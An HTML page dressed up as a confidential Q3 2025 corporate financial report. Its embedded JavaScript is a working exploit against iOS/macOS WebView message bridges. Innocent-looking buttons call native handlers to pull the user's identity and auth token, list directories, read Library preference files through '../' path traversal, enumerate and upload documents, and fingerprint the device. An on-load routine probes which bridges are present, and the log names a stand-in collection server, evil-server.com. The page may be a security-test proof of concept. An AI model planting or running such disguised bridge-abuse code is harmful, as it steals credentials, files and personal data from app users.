<!DOCTYPE html>
<html>
<head>
    <title>Corporate Financial Report Q3 2025</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            margin: 20px; 
            line-height: 1.6; 
        }
        .header { 
            background: #f8f9fa; 
            padding: 20px; 
            border-radius: 8px; 
            margin-bottom: 20px; 
        }
        .content { 
            margin-bottom: 30px; 
        }
        .section { 
            margin-bottom: 25px; 
        }
        .highlight { 
            background: #fff3cd; 
            padding: 10px; 
            border-radius: 4px; 
        }
        .button { 
            background: #007bff; 
            color: white; 
            padding: 10px 20px; 
            border: none; 
            border-radius: 4px; 
            margin: 5px; 
            cursor: pointer; 
        }
        .data-section { 
            background: #e9ecef; 
            padding: 15px; 
            border-radius: 6px; 
            margin: 10px 0; 
            display: none;
        }
        .exploit-log {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 4px;
            padding: 10px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Q3 2025 Financial Performance Report</h1>
        <p><strong>Document Type:</strong> Confidential Financial Analysis</p>
        <p><strong>Distribution:</strong> Board Members & Executive Team</p>
        <p><strong>Classification:</strong> Internal Use Only</p>
    </div>
    
    <div class="content">
        <div class="section">
            <h2>Executive Summary</h2>
            <p>This document contains the quarterly financial performance analysis for Q3 2025, including revenue projections, cost analysis, and strategic recommendations for the upcoming quarter.</p>
        </div>
        
        <div class="section">
            <h2>Key Performance Indicators</h2>
            <div class="highlight">
                <p><strong>Revenue Growth:</strong> 23.5% YoY increase</p>
                <p><strong>Operating Margin:</strong> 18.2% improvement</p>
                <p><strong>Customer Acquisition:</strong> 15,000 new enterprise clients</p>
            </div>
        </div>
        
        <div class="section">
            <h2>Interactive Dashboard</h2>
            <p>Click the buttons below to load detailed financial data:</p>
            <div>
                <button class="button" onclick="loadFinancialData()">Load Revenue Analysis</button>
                <button class="button" onclick="loadUserProfile()">Load User Profile</button>
                <button class="button" onclick="exportReport()">Export to Cloud</button>
                <button class="button" onclick="getSystemInfo()">System Information</button>
            </div>
        </div>
        
        <div id="exploitLog" class="exploit-log">
            <strong>System Log:</strong><br>
            Initializing document viewer...<br>
        </div>
        
        <div id="userData" class="data-section">
            <h3>User Profile Information</h3>
            <div id="userInfo">Loading user data...</div>
        </div>
        
        <div id="authData" class="data-section">
            <h3>Authentication Details</h3>
            <div id="authInfo">Loading authentication data...</div>
        </div>
        
        <div id="deviceData" class="data-section">
            <h3>Device Information</h3>
            <div id="deviceInfo">Loading device data...</div>
        </div>
        
        <div id="fileData" class="data-section">
            <h3>File System Access</h3>
            <div id="fileInfo">Loading file system data...</div>
        </div>
        
        <div id="documentData" class="data-section">
            <h3>Document Library</h3>
            <div id="documentInfo">Loading document data...</div>
        </div>
    </div>
    
    <script>
        let exploitLog = document.getElementById('exploitLog');
        
        function logExploit(message) {
            exploitLog.innerHTML += new Date().toLocaleTimeString() + ': ' + message + '<br>';
            exploitLog.scrollTop = exploitLog.scrollHeight;
        }
        
        function loadFinancialData() {
            logExploit('Loading financial data...');
            
            // Exploit: Access authentication bridge
            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.authBridge) {
                logExploit('✓ Found authBridge - extracting user credentials');
                window.webkit.messageHandlers.authBridge.postMessage({
                    action: 'getCurrentUser'
                });
                
                window.webkit.messageHandlers.authBridge.postMessage({
                    action: 'getAuthToken'
                });
                
                document.getElementById('userData').style.display = 'block';
                document.getElementById('authData').style.display = 'block';
            } else {
                logExploit('✗ authBridge not available');
            }
        }
        
        function loadUserProfile() {
            logExploit('Accessing user profile...');
            
            // Exploit: Access file system
            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.fileManager) {
                logExploit('✓ Found fileManager - accessing file system');
                
                // Try to list documents directory
                window.webkit.messageHandlers.fileManager.postMessage({
                    action: 'listDirectory',
                    path: '../'
                });
                
                // Try to read app preferences
                window.webkit.messageHandlers.fileManager.postMessage({
                    action: 'readFile',
                    path: '../Library/Preferences/com.apple.identityservices.plist'
                });
                
                // Try to read user defaults
                window.webkit.messageHandlers.fileManager.postMessage({
                    action: 'readFile',
                    path: '../Library/Preferences/.GlobalPreferences.plist'
                });
                
                document.getElementById('fileData').style.display = 'block';
            } else {
                logExploit('✗ fileManager not available');
            }
        }
        
        function exportReport() {
            logExploit('Exporting to cloud...');
            
            // Exploit: Access document handler
            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.documentHandler) {
                logExploit('✓ Found documentHandler - accessing document library');
                window.webkit.messageHandlers.documentHandler.postMessage({
                    action: 'getDocumentList'
                });
                
                document.getElementById('documentData').style.display = 'block';
            } else {
                logExploit('✗ documentHandler not available');
            }
            
            // Exploit: Access cloud sync
            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.cloudSync) {
                logExploit('✓ Found cloudSync - accessing cloud services');
                window.webkit.messageHandlers.cloudSync.postMessage({
                    action: 'uploadDocument',
                    data: document.documentElement.outerHTML
                });
            } else {
                logExploit('✗ cloudSync not available');
            }
        }
        
        function getSystemInfo() {
            logExploit('Gathering system information...');
            
            // Exploit: Access device manager
            if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.deviceManager) {
                logExploit('✓ Found deviceManager - extracting device info');
                window.webkit.messageHandlers.deviceManager.postMessage({
                    action: 'getDeviceInfo'
                });
                
                document.getElementById('deviceData').style.display = 'block';
            } else {
                logExploit('✗ deviceManager not available');
            }
        }
        
        // Set up receivers for exfiltrated data
        window.receiveUserInfo = function(userInfo) {
            logExploit('✓ SUCCESS: User data extracted!');
            document.getElementById('userInfo').innerHTML = 
                '<p><strong>Name:</strong> ' + userInfo.fullName + '</p>' +
                '<p><strong>Email:</strong> ' + userInfo.email + '</p>' +
                '<p><strong>Company:</strong> ' + userInfo.company + '</p>' +
                '<p><strong>Plan:</strong> ' + userInfo.plan + '</p>' +
                '<p><strong>User ID:</strong> ' + userInfo.id + '</p>';
            
            // In a real attack, this would be sent to an attacker server
            logExploit('Data would be exfiltrated to: https://evil-server.com/collect');
        };
        
        window.receiveAuthToken = function(token) {
            logExploit('✓ SUCCESS: Authentication token extracted!');
            document.getElementById('authInfo').innerHTML = 
                '<p><strong>Auth Token:</strong> ' + token.substring(0, 20) + '...</p>' +
                '<p><strong>Token Length:</strong> ' + token.length + ' characters</p>' +
                '<p><strong>Status:</strong> Active session token captured</p>';
            
            logExploit('AUTH TOKEN: ' + token.substring(0, 30) + '...');
        };
        
        window.receiveDeviceInfo = function(deviceInfo) {
            logExploit('✓ SUCCESS: Device information extracted!');
            document.getElementById('deviceInfo').innerHTML = 
                '<p><strong>Model:</strong> ' + deviceInfo.model + '</p>' +
                '<p><strong>System:</strong> ' + deviceInfo.systemName + ' ' + deviceInfo.systemVersion + '</p>' +
                '<p><strong>Identifier:</strong> ' + deviceInfo.identifier + '</p>';
            
            logExploit('Device fingerprinted: ' + deviceInfo.model + ' running ' + deviceInfo.systemName);
        };
        
        window.receiveFileContent = function(content) {
            logExploit('✓ SUCCESS: File content extracted!');
            document.getElementById('fileInfo').innerHTML += 
                '<div style="border: 1px solid #ccc; padding: 10px; margin: 5px 0; background: #f9f9f9;">' +
                '<strong>File Content Preview:</strong><br>' +
                '<pre style="font-size: 10px; max-height: 100px; overflow: auto;">' + 
                content.substring(0, 200) + (content.length > 200 ? '...' : '') +
                '</pre></div>';
        };
        
        window.receiveDirectoryListing = function(files) {
            logExploit('✓ SUCCESS: Directory listing extracted!');
            document.getElementById('fileInfo').innerHTML += 
                '<div style="border: 1px solid #ccc; padding: 10px; margin: 5px 0; background: #f9f9f9;">' +
                '<strong>Directory Contents:</strong><br>' +
                files.join(', ') +
                '</div>';
        };
        
        window.receiveDocumentList = function(documents) {
            logExploit('✓ SUCCESS: Document library accessed!');
            let docHtml = '<strong>User Documents:</strong><br>';
            documents.forEach(function(doc) {
                docHtml += '<div style="border-bottom: 1px solid #eee; padding: 5px 0;">';
                docHtml += '<strong>' + doc.name + '</strong> (' + doc.type + ')<br>';
                docHtml += 'Author: ' + doc.author + ' | Size: ' + doc.size + ' bytes<br>';
                docHtml += 'ID: ' + doc.id;
                docHtml += '</div>';
            });
            document.getElementById('documentInfo').innerHTML = docHtml;
        };
        
        // Auto-execute exploitation on page load
        document.addEventListener('DOMContentLoaded', function() {
            logExploit('Document loaded - JavaScript bridge exploitation initialized');
            logExploit('Checking for available bridges...');
            
            // Check what bridges are available
            if (window.webkit && window.webkit.messageHandlers) {
                let bridges = ['documentHandler', 'fileManager', 'cloudSync', 'authBridge', 'deviceManager'];
                bridges.forEach(function(bridge) {
                    if (window.webkit.messageHandlers[bridge]) {
                        logExploit('✓ Bridge available: ' + bridge);
                    } else {
                        logExploit('✗ Bridge not found: ' + bridge);
                    }
                });
                
                logExploit('Ready for exploitation - click buttons above to extract data');
            } else {
                logExploit('✗ No WebKit message handlers found');
            }
        });
    </script>
</body>
</html>
